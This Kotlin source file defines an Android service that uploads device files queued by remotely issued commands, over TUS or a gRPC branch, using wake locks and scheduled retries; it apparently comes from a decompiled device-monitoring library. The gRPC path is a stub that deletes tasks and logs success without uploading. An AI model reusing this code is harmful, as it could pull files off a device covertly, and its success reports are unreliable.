package com.hawkshaw.library.features.media.filecrud

import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log // Added for Android logging
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity
import com.hawkshaw.library.handler.handleCommand
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import java.io.File

class PushFileManagerService : Service() {
    companion object {
        private const val TAG = "PushFileManagerService"
        private const val DELAY_BETWEEN_RETRY = 300000L
        private const val FILE_SIZE_NETWORK_THRESHOLD = 104857600
        private const val PRIORITY_THRESHOLD = 5
    }

    private val wakeLock by lazy {
        Log.d(TAG, "[DEBUG] Initializing wakeLock.")
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PushFileManagerService:WakeLock").apply {
            setReferenceCounted(false)
        }
    }

    private val db by lazy {
        Log.d(TAG, "[DEBUG] Initializing AppDatabaseKt.db.")
        AppDatabaseKt.db
    }
    private val pushFileTaskDao by lazy {
        Log.d(TAG, "[DEBUG] Initializing pushFileTaskDao.")
        db.pushFileTaskDao()
    }

    private fun hasWifiNetwork(): Boolean {
        Log.d(TAG, "[DEBUG] hasWifiNetwork called.")
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetwork = connectivityManager.activeNetwork
        Log.d(TAG, "[DEBUG] hasWifiNetwork: Active network: $activeNetwork")
        if (activeNetwork == null) {
            Log.d(TAG, "[DEBUG] hasWifiNetwork: No active network. Returning false.")
            return false
        }
        val networkCapabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
        Log.d(TAG, "[DEBUG] hasWifiNetwork: Network capabilities: $networkCapabilities")
        val hasWifi = networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true ||
                networkCapabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true
        Log.d(TAG, "[DEBUG] hasWifiNetwork: Has Wi-Fi or Ethernet: $hasWifi")
        return hasWifi
    }

    override fun onBind(intent: Intent?): IBinder? {
        Log.d(TAG, "[DEBUG] onBind called with intent: $intent. Returning null.")
        return null
    }

    @RequiresApi(Build.VERSION_CODES.P)
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "[DEBUG] onCreate called.")
        try {
            Log.d(TAG, "[DEBUG] Acquiring wakeLock with timeout 1800000ms.")
            wakeLock.acquire(1800000) // 30 minutes
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error acquiring wakeLock: ${e.message}", e)
            Logger.e(TAG, "Error acquiring wakeLock in onCreate", e, false, 12, null)
        }
        Log.d(TAG, "[DEBUG] Launching coroutine for pushNextFile from onCreate.")
        CoroutineScope(Dispatchers.IO).safeLaunch {
            pushNextFile()
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "[DEBUG] onDestroy called.")
        // Existing Logger.v is fine.
        Logger.v(TAG, "OnDestroy called", false, 4, null)
        try {
            if (wakeLock.isHeld) {
                Log.d(TAG, "[DEBUG] Releasing wakeLock.")
                wakeLock.release()
            } else {
                Log.d(TAG, "[DEBUG] wakeLock not held, no need to release.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error releasing wakeLock: ${e.message}", e)
            Logger.e(TAG, "Error releasing wakeLock in onDestroy", e, false, 12, null)
        }
        super.onDestroy()
    }

    private suspend fun processTusUpload(task: PushFileTaskEntity) {
        Log.d(TAG, "[DEBUG] processTusUpload called for task: ${task.id}, path: ${task.path}")
        val file = File(task.path)
        if (!file.exists() || !file.isFile) {
            Log.e(TAG, "[DEBUG] TUS Upload: File ${file.path} is not a valid file. Deleting task.")
            // Existing Logger.e is fine.
            Logger.e(
                TAG,
                "PushFile: ${file.path} is not a valid file, aborting upload",
                b = false,
                i = 12,
                nothing = null
            )
            pushFileTaskDao.delete(task)
            Log.d(TAG, "[DEBUG] TUS Upload: Deleted invalid task ${task.id} from DB.")
            return
        }

        Log.d(TAG, "[DEBUG] TUS Upload: Starting for file: ${file.path}, Size: ${file.length()}, WiFi: ${hasWifiNetwork()}")
        // Existing Logger.v is fine.
        Logger.v(
            TAG, """
                PushFileTus: Upload starting... ${file.path}, 
                WiFi: ${hasWifiNetwork()}, Size: ${file.length() / 1048576}MB
            """.trimIndent(), false, 4, null
        )

        try {
            Log.d(TAG, "[DEBUG] TUS Upload: Calling uploadFileTus for ${file.path}.")
            uploadFileTus(applicationContext, file, task.source, task.buffer)
            Log.d(TAG, "[DEBUG] TUS Upload: uploadFileTus completed for ${file.path}. Deleting task ${task.id}.")
            pushFileTaskDao.delete(task)
            Log.d(TAG, "[DEBUG] TUS Upload: Deleted task ${task.id} from DB after successful upload.")
            // Existing Logger.d is fine.
            Logger.d(TAG, "TUS upload completed for ${file.path}", false, 4, null)
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] TUS Upload: Exception during uploadFileTus for ${file.path}: ${e.message}", e)
            // Existing Logger.e is fine.
            Logger.e(TAG, "PushFileTus: ${e.message}", e, false, 12, null)
            throw e // Rethrow to be handled by pushNextFile's catch block
        }
    }

    private suspend fun processGrpcUpload(task: PushFileTaskEntity) {
        Log.d(TAG, "[DEBUG] processGrpcUpload called for task: ${task.id}, path: ${task.path}")
        val file = File(task.path)
        if (!file.exists() || !file.isFile) {
            Log.e(TAG, "[DEBUG] gRPC Upload: File ${file.path} is not a valid file. Deleting task.")
            // Existing Logger.e is fine.
            Logger.e(
                TAG,
                "PushFile: ${file.path} is not a valid file, aborting upload",
                b = false,
                i = 12,
                nothing = null
            )
            pushFileTaskDao.delete(task)
            Log.d(TAG, "[DEBUG] gRPC Upload: Deleted invalid task ${task.id} from DB.")
            return
        }

        Log.d(TAG, "[DEBUG] gRPC Upload: Starting for file: ${file.path}, Size: ${file.length()}, WiFi: ${hasWifiNetwork()}")
        // Existing Logger.v is fine.
        Logger.v(
            TAG, """
                PushFile: Upload starting... ${file.path}, 
                WiFi: ${hasWifiNetwork()}, Size: ${file.length() / 1048576}MB
            """.trimIndent(), false, 4, null
        )

        try {
            Log.d(TAG, "[DEBUG] gRPC Upload: Attempting gRPC upload logic for ${file.path}.")
            // Implement your gRPC upload logic here
            // For now, assuming success and deleting task as per original code
            Log.d(TAG, "[DEBUG] gRPC Upload: (Placeholder) gRPC logic executed. Deleting task ${task.id}.")
            pushFileTaskDao.delete(task)
            Log.d(TAG, "[DEBUG] gRPC Upload: Deleted task ${task.id} from DB after successful upload (placeholder).")
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] gRPC Upload: Exception during gRPC upload for ${file.path}: ${e.message}", e)
            // Existing Logger.e is fine.
            Logger.e(TAG, "PushFile: ${e.message}", e, false, 12, null)
            throw e // Rethrow to be handled by pushNextFile's catch block
        }
    }

    private suspend fun pushFile(task: PushFileTaskEntity) {
        Log.d(TAG, "[DEBUG] pushFile called for task ID: ${task.id}, path: ${task.path}, medium: ${task.medium}")
        // Increment priority and update timestamp first
        Log.d(TAG, "[DEBUG] Incrementing priority for task ${task.id}.")
        pushFileTaskDao.incrementPriority(task.id)
        val currentTime = System.currentTimeMillis()
        Log.d(TAG, "[DEBUG] Setting last push timestamp for task ${task.id} to $currentTime.")
        pushFileTaskDao.setLastPushTimestamp(task.id, currentTime)

        Log.d(TAG, "[DEBUG] Processing task ${task.id} with medium: ${task.medium}")
        when (task.medium) {
            Command.FileRequest.Medium.Tus -> {
                Log.d(TAG, "[DEBUG] Calling processTusUpload for task ${task.id}.")
                processTusUpload(task)
            }
            else -> { // Assuming Grpc or any other default
                Log.d(TAG, "[DEBUG] Calling processGrpcUpload for task ${task.id}.")
                processGrpcUpload(task)
            }
        }
        Log.d(TAG, "[DEBUG] pushFile completed for task ID: ${task.id}")
    }

    @RequiresApi(Build.VERSION_CODES.P)
    private suspend fun pushNextFile() {
        Log.d(TAG, "[DEBUG] pushNextFile called.")
        val hasWifi = hasWifiNetwork()
        Log.d(TAG, "[DEBUG] pushNextFile: Has WiFi: $hasWifi")

        val task: PushFileTaskEntity?
        if (hasWifi) {
            Log.d(TAG, "[DEBUG] pushNextFile: WiFi available. Getting top task without size restriction.")
            task = pushFileTaskDao.getTopTask()
        } else {
            Log.d(TAG, "[DEBUG] pushNextFile: No WiFi. Getting top task with size threshold: $FILE_SIZE_NETWORK_THRESHOLD.")
            task = pushFileTaskDao.getTopTask(FILE_SIZE_NETWORK_THRESHOLD)
        }
        Log.d(TAG, "[DEBUG] pushNextFile: Retrieved task: ${task?.id} (Path: ${task?.path})")

        if (task == null) {
            if (!hasWifi && pushFileTaskDao.getTopTask() != null) {
                Log.d(TAG, "[DEBUG] pushNextFile: No suitable task for cellular, but large files exist. WiFi needed.")
                // Existing Logger.v is fine.
                Logger.v(TAG, "PushFile: Large file pending but wifi not available", false, 4, null)
            } else {
                Log.d(TAG, "[DEBUG] pushNextFile: No pending push file tasks found that meet criteria.")
                // Existing Logger.v is fine.
                Logger.v(TAG, "PushFile: No pending push file task", false, 4, null)
            }
            Log.d(TAG, "[DEBUG] pushNextFile: No task to process. Stopping self.")
            stopSelf()
            return
        }
        Log.d(TAG, "[DEBUG] pushNextFile: Processing task ID: ${task.id}, Path: ${task.path}, Priority: ${task.priority}")

        if (task.priority > PRIORITY_THRESHOLD) {
            Log.e(TAG, "[DEBUG] pushNextFile: Retries exhausted for task ${task.id} (priority ${task.priority}). Deleting task.")
            // Existing Logger.e is fine.
            Logger.e(
                TAG,
                "PushFile: Re-tries(${task.priority}) exhausted for ${task.path}",
                b = false,
                i = 12,
                nothing = null
            )
            pushFileTaskDao.delete(task)
            Log.d(TAG, "[DEBUG] pushNextFile: Deleted task ${task.id} due to exceeded priority. Calling pushNextFile again.")
            pushNextFile() // Process next file if available
            return
        }

        val timeSinceLastPush = System.currentTimeMillis() - task.lastPushTimestamp
        Log.d(TAG, "[DEBUG] pushNextFile: Task ${task.id}, Time since last push: $timeSinceLastPush ms. Delay between retry: $DELAY_BETWEEN_RETRY ms.")
        if (task.lastPushTimestamp != 0L && timeSinceLastPush < DELAY_BETWEEN_RETRY) { // Ensure lastPushTimestamp is not default 0L for new tasks
            Log.d(TAG, "[DEBUG] pushNextFile: Will retry task ${task.id} (${task.path}) after delay. Scheduling command.")
            // Existing Logger.v is fine.
            Logger.v(TAG, "PushFile: Will retry ${task.path} after delay", false, 4, null)

            val triggerAt = System.currentTimeMillis() + DELAY_BETWEEN_RETRY
            val scheduleRequest = Command.ScheduleCommandRequest(
                command = Command(type = Command.CommandType.SyncPushFiles),
                triggerAt = triggerAt,
                interval = 0L,
                requestCode = 0
            )
            Log.d(TAG, "[DEBUG] pushNextFile: Created ScheduleCommandRequest to trigger at $triggerAt for SyncPushFiles.")

            handleCommand(
                Command(
                    type = Command.CommandType.ScheduleCommand,
                    scheduleCommandRequest = scheduleRequest
                ),
                CoroutineScope(Dispatchers.IO) // Using a new scope as per original
            )
            Log.d(TAG, "[DEBUG] pushNextFile: handleCommand called for scheduling. Stopping self.")
            stopSelf()
            return
        }

        try {
            Log.d(TAG, "[DEBUG] pushNextFile: Attempting to push file for task ${task.id}.")
            pushFile(task)
            Log.d(TAG, "[DEBUG] pushNextFile: pushFile completed for task ${task.id}. Calling pushNextFile again for next task.")
            pushNextFile()
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] pushNextFile: Error during pushFile for task ${task.id} (Path: ${task.path}): ${e.message}", e)
            // Existing Logger.e is fine.
            Logger.e(TAG, "Error in pushNextFile", e, false, 12, null)
            // The error will trigger a retry on the next service start, or if a scheduled command is picked up.
            // For immediate retry attempt after failure and delay, scheduling could be added here.
            // However, current logic implies retries happen on subsequent service starts/triggers.
            Log.d(TAG, "[DEBUG] pushNextFile: Error caught. Service will likely stop. Retry expected on next start/trigger.")
            stopSelf() // Stop service on error to prevent rapid retry loops without delay.
        }
    }
}
